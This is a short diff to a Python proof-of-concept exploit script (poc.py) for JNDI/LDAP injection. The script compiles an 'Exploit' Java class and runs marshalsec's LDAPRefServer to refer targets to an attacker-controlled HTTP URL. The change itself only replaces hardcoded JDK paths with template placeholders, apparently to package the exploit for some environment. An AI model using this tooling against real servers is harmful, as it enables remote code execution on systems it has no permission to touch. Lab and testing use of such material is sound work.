@@ -1,0 +1,53 @@
+*** poc.py-orig	2025-08-03 23:08:59.782097319 +0900
+--- poc.py	2025-08-03 23:09:05.325231174 +0900
+*************** public class Exploit {
+*** 59,65 ****
+  
+      try:
+          p.write_text(program)
+!         subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
+      except OSError as e:
+          print(Fore.RED + f'[-] Something went wrong {e}')
+          raise e
+--- 59,65 ----
+  
+      try:
+          p.write_text(program)
+!         subprocess.run([os.path.join(CUR_FOLDER, "{{ javac_path }}"), str(p)])
+      except OSError as e:
+          print(Fore.RED + f'[-] Something went wrong {e}')
+          raise e
+*************** def payload(userip: str, webport: int, l
+*** 84,90 ****
+  
+  def check_java() -> bool:
+      exit_code = subprocess.call([
+!         os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
+          '-version',
+      ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+      return exit_code == 0
+--- 84,90 ----
+  
+  def check_java() -> bool:
+      exit_code = subprocess.call([
+!         os.path.join(CUR_FOLDER, '{{ java_path }}'),
+          '-version',
+      ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+      return exit_code == 0
+*************** def ldap_server(userip: str, lport: int)
+*** 96,102 ****
+  
+      url = "http://{}:{}/#Exploit".format(userip, lport)
+      subprocess.run([
+!         os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
+          "-cp",
+          os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
+          "marshalsec.jndi.LDAPRefServer",
+--- 96,102 ----
+  
+      url = "http://{}:{}/#Exploit".format(userip, lport)
+      subprocess.run([
+!         os.path.join(CUR_FOLDER, "{{ java_path }}"),
+          "-cp",
+          os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
+          "marshalsec.jndi.LDAPRefServer",
